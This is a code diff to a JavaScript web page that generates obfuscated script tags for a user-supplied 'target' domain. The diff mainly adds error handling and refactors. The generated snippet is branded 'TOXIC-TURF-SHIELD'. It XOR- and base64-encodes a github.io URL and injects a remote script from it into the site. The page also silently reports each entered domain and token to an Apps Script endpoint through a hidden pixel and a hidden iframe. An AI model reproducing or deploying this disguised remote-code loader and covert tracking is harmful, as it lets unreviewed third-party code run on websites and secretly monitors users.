@@ -90,45 +90,49 @@
 
         function _obfuscate(text, key) {
             let result = '';
-            for (let i = 0; i < text.length; i++) {
-                result += String.fromCharCode(text.charCodeAt(i) ^ key);
+            const safeText = encodeURIComponent(text);
+            for (let i = 0; i < safeText.length; i++) {
+                result += String.fromCharCode(safeText.charCodeAt(i) ^ key);
             }
             return btoa(result);
         }
 
         function _gn8x() {
-            const _d = document.getElementById('targetDomain').value.trim();
-            const _box = document.getElementById('resultContainer');
-            const _txt = document.getElementById('resultText');
+            try {
+                const _d = document.getElementById('targetDomain').value.trim();
+                const _box = document.getElementById('resultContainer');
+                const _txt = document.getElementById('resultText');
 
-            if (!_d) {
-                alert('Error: Please enter a target website domain.');
-                return;
-            }
+                if (!_d) {
+                    alert('Error: Please enter a target website domain.');
+                    return;
+                }
 
-            const _vDomain = _rndStr(5);
-            const _vToken = _rndStr(6);
-            const _vFn = _rndStr(7);
-            const _vCdn = _rndStr(6);
-            const _vKey = Math.floor(Math.random() * 200) + 15;
-            const _tokenHex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
-                                   .map(b => b.toString(16).padStart(2, '0')).join('');
+                const _vDomain = _rndStr(5);
+                const _vToken = _rndStr(6);
+                const _vFn = _rndStr(7);
+                const _vCdn = _rndStr(6);
+                const _vKey = Math.floor(Math.random() * 200) + 15;
+                
+                const array = new Uint8Array(8);
+                crypto.getRandomValues(array);
+                const _tokenHex = Array.from(array, b => b.toString(16).padStart(2, '0')).join('');
 
-            const _u = "edthedog-debug";
-            const _r = "secure-shield-cdn";
-            const _rawCdnUrl = "https://" + _u + ".github.io/" + _r + "/shield.min.js";
+                const _u = "edthedog-debug";
+                const _r = "secure-shield-cdn";
+                const _rawCdnUrl = "https://" + _u + ".github.io/" + _r + "/shield.min.js";
 
-            const _encDomain = _obfuscate(_d, _vKey);
-            const _encCdn = _obfuscate(_rawCdnUrl, _vKey);
+                const _encDomain = _obfuscate(_d, _vKey);
+                const _encCdn = _obfuscate(_rawCdnUrl, _vKey);
 
-            const _closeTag = '</' + 'script>';
+                const _closeTag = '</' + 'script>';
 
-            const _scriptPayload = 
+                const _scriptPayload = 
 '<script>\n' +
 '/* [TOXIC-TURF-SHIELD // TARGET: ' + _d.toUpperCase() + ' // SIG: ' + _tokenHex + '] */\n' +
 '!(function(){\n' +
-'  const ' + _vDomain + ' = decodeURIComponent(atob(\'' + _encDomain + '\').split(\'\').map(c=>String.fromCharCode(c.charCodeAt(0)^' + _vKey + ')).join(\'\'));\n' +
-'  const ' + _vCdn + ' = decodeURIComponent(atob(\'' + _encCdn + '\').split(\'\').map(c=>String.fromCharCode(c.charCodeAt(0)^' + _vKey + ')).join(\'\'));\n' +
+'  const ' + _vDomain + ' = decodeURIComponent(atob(\'' + _encDomain + '\').split(\'\').map(function(c){return String.fromCharCode(c.charCodeAt(0)^' + _vKey + ');}).join(\'\'));\n' +
+'  const ' + _vCdn + ' = decodeURIComponent(atob(\'' + _encCdn + '\').split(\'\').map(function(c){return String.fromCharCode(c.charCodeAt(0)^' + _vKey + ');}).join(\'\'));\n' +
 '  const ' + _vToken + ' = "' + _tokenHex + '";\n' +
 '  window._TT_SIG = { domain: ' + _vDomain + ', token: ' + _vToken + ' };\n' +
 '  const ' + _vFn + ' = document.createElement(\'script\');\n' +
@@ -138,28 +142,30 @@
 '})();\n' +
 _closeTag;
 
-            _txt.innerText = _scriptPayload;
-            _box.style.display = 'block';
+                _txt.innerText = _scriptPayload;
+                _box.style.display = 'block';
 
-            // Log execution using multiple redundant methods to guarantee execution across mobile and desktop
-            if (APPS_SCRIPT_URL && APPS_SCRIPT_URL.startsWith("https://")) {
-                const queryParams = new URLSearchParams({
-                    domain: _d,
-                    token: _tokenHex,
-                    timestamp: new Date().toISOString()
-                });
-                const fullUrl = APPS_SCRIPT_URL + '?' + queryParams.toString();
+                // Log execution via Pixel Tracker & fallback iframe
+                if (APPS_SCRIPT_URL && APPS_SCRIPT_URL.startsWith("https://")) {
+                    const queryParams = new URLSearchParams({
+                        domain: _d,
+                        token: _tokenHex,
+                        timestamp: new Date().toISOString()
+                    });
+                    const fullUrl = APPS_SCRIPT_URL + '?' + queryParams.toString();
 
-                // Method 1: Pixel Tracker Image Object
-                const tracker = new Image();
-                tracker.src = fullUrl;
+                    const tracker = new Image();
+                    tracker.src = fullUrl;
 
-                // Method 2: Invisible iframe fallback
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = fullUrl;
-                document.body.appendChild(iframe);
-                setTimeout(function() { if (iframe.parentNode) iframe.parentNode.removeChild(iframe); }, 3000);
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = fullUrl;
+                    document.body.appendChild(iframe);
+                    setTimeout(function() { if (iframe.parentNode) iframe.parentNode.removeChild(iframe); }, 3000);
+                }
+            } catch (err) {
+                console.error("Generator Error:", err);
+                alert("Generation error: " + err.message);
             }
         }
     </script>
